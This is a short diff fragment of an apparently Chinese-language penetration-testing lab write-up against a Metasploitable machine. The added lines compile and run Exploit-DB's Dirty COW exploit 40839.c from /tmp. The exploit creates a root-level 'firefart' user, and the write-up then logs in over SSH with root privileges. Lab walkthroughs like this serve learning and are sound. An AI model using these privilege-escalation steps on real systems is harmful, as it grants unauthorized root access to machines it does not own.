@@ -53,3 +53,20 @@ emmm，加上缺少的头文件还是提权失败，换个exp
 
 
 
+`/usr/share/exploitdb/exploits/linux/local/40839.c`
+
+上传，编译，运行。会创建一个firefart用户，uid=0，密码为执行文件时传入的参数
+
+```
+(www-data:/tmp) $ gcc -pthread 40839.c -o dirty -lcrypt
+40839.c:193:2: warning: no newline at end of file
+(www-data:/tmp) $ ./dirty pass
+```
+
+ssh过去，成功拿到超级用户权限
+
+```
+$ ssh firefart@10.16.28.149
+firefart@metasploitable:~#
+```
+
